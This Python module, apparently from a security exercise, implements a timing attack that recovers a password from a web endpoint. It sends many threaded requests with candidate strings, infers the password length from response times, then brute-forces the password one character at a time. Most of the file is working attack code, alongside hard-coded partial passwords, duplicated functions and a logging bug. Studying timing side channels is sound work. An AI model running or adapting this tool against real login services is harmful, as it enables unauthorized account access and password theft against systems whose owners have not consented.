import os
import logging as log
from time import time
import time as timer
import Configurations
import urllib.request
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor


# - - - - - - - - - -  LOG SECTION  - - - - - - - - - -

def create_folder_if_not_exists(folder_path: str) -> str:
    """
    This function create a given folder if it doesnt exists.
    :param folder_path: String. path to the given folder that need to be created.
    """
    if not os.path.exists(folder_path):
        os.mkdir(folder_path)


def set_logger(result_path: str, class_name: str, log_filename=None) -> log.Logger:
    """
    The function initial logger to documenting the RGB colors of the given pixel.

    :param result_path.String. represent path to result folder.
    :param class_name. String. class name of the logger.
    :param log_filename.String. custom file name. if None is given, file name will be 'logfile_{current date and time}.log
    :return: logger instance.
    """

    class MyFormatter(log.Formatter):
        converter = datetime.fromtimestamp

        def formatTime(self, record, datefmt=None):
            ct = self.converter(record.created)
            if datefmt:
                s = ct.strftime(datefmt)
            else:
                t = ct.strftime("%Y-%m-%d %H:%M:%S")
                s = "%s,%03d" % (t, record.msecs)
            return s

    # Set up a specific logger with our desired output level
    if log_filename is None:
        log_filename = f'logfile_{get_current_date_and_time()}.log'

    create_folder_if_not_exists(result_path)
    create_folder_if_not_exists(os.path.join(result_path, class_name))

    log.basicConfig(filename=os.path.join(result_path, class_name, log_filename), filemode='w', level=Configurations.log_level)
    logger = log.getLogger('MyLogger')
    formatter = MyFormatter(fmt='%(asctime)s %(message)s', datefmt='%Y-%m-%d,%H:%M:%S.%f')
    handler = log.StreamHandler()
    handler.setLevel(Configurations.log_level)
    handler.setFormatter(formatter)

    logger.addHandler(handler)

    return logger


def get_current_date_and_time() -> datetime:
    """
    This function return a current date and time in this representation DD-MM-YYYY HH:MM.
    :return: String, represent day and time.
    """
    return datetime.now().strftime('%d-%m-%Y %H-%M')


def get_session() -> None:
    """
    return session as a string.
    """
    if Configurations.session is None:
        Configurations.session = Configurations.running_folder_format
        create_folder_if_not_exists(os.path.join(Configurations.RESULTS_PATH, Configurations.session))

    return Configurations.session


def write_log(logger, message: str, log_level="info", print_to_console=Configurations.write_to_console) -> None:
    """
    Write the given message to the given og file at the specified log info.

    :param logger: Logger.
    :param message: String. message to write to log.
    :param log_level: String, represnt message log level.
    """
    if logger:
        if log_level == "info":
            logger.info(message)
        elif logger == "debug":
            logger.debug(message)
        else:
            pass

    if print_to_console:
        print(message)


def set_logger(result_path: str, class_name: str, log_filename: str = None) -> log.Logger:
    """
    The function initial logger to documenting the RGB colors of the given pixel.

    :param result_path.String. represent path to result folder.
    :param class_name. String. class name of the logger.
    :param log_filename.String. custom file name. if None is given, file name will be 'logfile_{current date and time}.log

    :return: logger instance.
    """
    # Set up a specific logger with our desired output level
    if log_filename is None:
        log_filename = f'logfile_{get_current_date_and_time()}.log'

    create_folder_if_not_exists(result_path)
    create_folder_if_not_exists(os.path.join(result_path, class_name))

    log.basicConfig(filename=os.path.join(result_path, class_name, log_filename), filemode='w', level=Configurations.log_level)
    logger = log.getLogger('MyLogger')

    return logger


# - - - - - - - - - -  FILE SECTION  - - - - - - - - - -

def create_folder_if_not_exists(folder_path: str) -> None:
    """
    Create a given folder if not already exists.

    :param folder_path: Str. path to folder.

    :return: None.
    """
    if not os.path.exists(folder_path):
        os.mkdir(folder_path)


# - - - - - - - - - -  PASSWORD SECTION  - - - - - - - - - -

def run_url(url: str) -> str:
    """
    This function request to given url and return it source code as a string.

    :param url: String. URL to request.

    :return: str. source code of the given URL.
    """
    timer.sleep(Configurations.sleep_time)
    ans = urllib.request.urlopen(url)
    timer.sleep(Configurations.sleep_time)

    return ans.read().decode("utf-8")


def check_password_size_thread(url: str, iterations: int, thread_number: int, logger) -> float:
    """
    This function request the given URL iteration times and sum the requests time and return it.

    :param url: String. Given URL to send the request.
    :param iterations: Int. Number of iteration to request the given URL.
    :param thread_number: Int. Thread ID
    :param logger: logger. if not None the function write it action to the given logger.

    :return: Float. Sum all the requests time.
    """
    total_iterations_time = 0

    for i in range(iterations):
        # measure time
        start = time()
        run_url(url)
        end = time()

        # insert to dict
        total_iterations_time += end - start

        if i % 100 == 0:
            write_log(logger, f"[check password size thread][thread {thread_number}][iter {i}] result: {total_iterations_time}:")

    return total_iterations_time


def check_password_size(start_url: str = "", end_url: str = "",
                        max_password_size: int = Configurations.default_password_size, logger=None) -> int:
    """
    The function uses timing attack (by time gap) the size of the password.

    :param start_url: String. the first part of the URL.
    :param end_url: String. the last part of the URL.
    :param max_password_size: String. the first part of the URL.
    :param logger: logger. if not None the function write it action to the given logger.

    :return: Int. size of the password by timing attack.
    """
    thread_pool = ThreadPoolExecutor(max_workers=Configurations.max_of_threads)

    future_results = []

    for i in range(0, max_password_size + 1, 1):
        url = f'{start_url}{Configurations.default_character * i}{end_url}'
        future_results.append(thread_pool.submit(check_password_size_thread, url, Configurations.attempts, i, logger))

    thread_pool.shutdown(wait=True)

    for i in range(max_password_size + 1):
        future_results[i] = future_results[i].result()

    password_length_index = future_results.index(max(future_results))
    write_log(logger, f"[check_password_size]: password length is: {password_length_index}")

    return password_length_index


def crack_password_thread(url, ch, iterations: int=Configurations.attempts, logger=None):
    """
    This function request the given URL iteration times and sum the requests time and return it.

    :param url: String. a full URL
    :param ch:
    :param iterations:
    :param logger: logger. if not None the function write it action to the given logger.

    :return:
    """
    total_iterations_time = 0

    for i in range(iterations):
        # measure time
        start = time()
        result = run_url(url)
        end = time()

        # insert to dict
        total_iterations_time += (end - start)
        if result == '1':
            raise ValueError(f"FoundPassWord! 'url'.")
        if i % 1 == 0:
            write_log(logger, f"[crack password thread][{ch}][iteration {i}] result time: {total_iterations_time}  -  {url}")

    return ch, total_iterations_time


def crack_password(password_size: int, start_url: str = "", end_url: str = "", logger=None):
    """

    :param size:
    :param logger:
    :return:
    """

    password = "izxuwlxfktdnba"
    password = "izxuwlxfktd"
    password = ""

    for i in range(password_size - len(password)):

        thread_pool = ThreadPoolExecutor(max_workers=Configurations.max_of_threads)
        future_results = []

        for ch in Configurations.characters:
            url = f"{start_url}{password}{ch}{Configurations.default_character * ((password_size - len(password) - 1))}{end_url}"
            future_results.append(thread_pool.submit(crack_password_thread, url, ch, Configurations.attempts, logger))

        thread_pool.shutdown(wait=True)

        letters_dict = {}

        for j in range(len(future_results)):
            result = future_results[j].result()
            letters_dict[result[0]] = result[1]

        maximum_key = max(letters_dict, key=letters_dict.get)
        print(maximum_key, letters_dict[maximum_key])

        password += maximum_key
        write_log(logger, f"[crack password]: iteration {i} got that the chosen letter if: {maximum_key} (current password is '{password}).')")

    write_log(logger, f"[crack password]: password found: {password}   .")

    return password


def timing_attack(start_url: str = "", end_url: str = "",
                  password_size: int = Configurations.default_password_size) -> str:
    """
    This function get url and password size and return the password by using a time attack.

    :param start_url: str. first part of the url before password appear.
    :param end_url: str. last part of the url after password appear.
    :param password_size: Int. max size of the password that possible.

    :return: Int. password as a string. None if couldn't find any.
    """
    logger = set_logger(Configurations.result_path, "crack password")

    size = 15
    # size = check_password_size(start_url, end_url, password_size, logger)

    if size is None:
        return None

    write_log(logger, f"[timing attack]: password with maximal time is in length: {size}.")
    write_log(logger, f"[timing attack]: starting to lookup password in size {size}.")

    plaintext_password = crack_password(password_size=size, start_url=start_url, end_url=end_url, logger=logger)

    if plaintext_password is None:
        return None

    write_log(logger, f"password is: {plaintext_password}.")

    return plaintext_password
